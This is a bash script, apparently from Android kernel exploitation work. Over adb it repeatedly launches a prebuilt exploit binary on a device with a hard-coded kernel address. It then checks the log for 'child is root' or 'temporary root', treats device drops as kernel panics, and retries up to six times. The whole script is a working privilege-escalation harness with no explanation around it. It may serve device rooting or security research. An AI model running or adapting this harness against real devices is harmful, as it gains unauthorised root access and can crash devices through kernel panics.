#!/bin/bash
# 反复尝试带 GLK_ZERO_ADDR 的 exploit，直到 W1c 执行或次数用尽
export PATH="/g/ADB-platform-tools:$PATH"
ADB=adb

wait_online() {
  for i in $(seq 1 45); do
    "$ADB" start-server >/dev/null 2>&1
    if "$ADB" devices 2>/dev/null | grep -q "device$"; then
      return 0
    fi
    sleep 4
  done
  return 1
}

dev_sh() { MSYS_NO_PATHCONV=1 "$ADB" shell "$1" 2>/dev/null; }

for attempt in 1 2 3 4 5 6; do
  if ! wait_online; then
    echo "device never came back, abort"
    exit 1
  fi
  up=$(dev_sh 'cut -d" " -f1 /proc/uptime' | tr -d '\r')
  echo "=== attempt $attempt  $(date '+%H:%M:%S')  uptime=$up"
  MSYS_NO_PATHCONV=1 "$ADB" shell 'rm -f /data/local/tmp/glk-run.log; GLK_ZERO_ADDR=0xffffffc0830c7708 setsid /data/local/tmp/glk-bin --load-prebuilt-profile /data/local/tmp/profile_175.bin > /data/local/tmp/glk-run.log 2>&1 & echo launched' >/dev/null 2>&1
  reached=0
  for t in $(seq 1 12); do
    sleep 5
    if ! "$ADB" devices 2>/dev/null | grep -q "device$"; then
      echo "  device dropped ~$((t*5))s (panic)"
      break
    fi
    if dev_sh 'grep -qa "child is root" /data/local/tmp/glk-run.log'; then
      reached=1
      echo "  child is root at ~$((t*5))s"
      break
    fi
  done
  if [ "$reached" = "1" ]; then
    echo "  --- W1c lines ---"
    dev_sh 'grep -aE "W1c|temporary root" /data/local/tmp/glk-run.log | tail -4'
    echo "ATTEMPT_OK $attempt"
    exit 0
  fi
done
echo "ALL_ATTEMPTS_FAILED"
exit 1
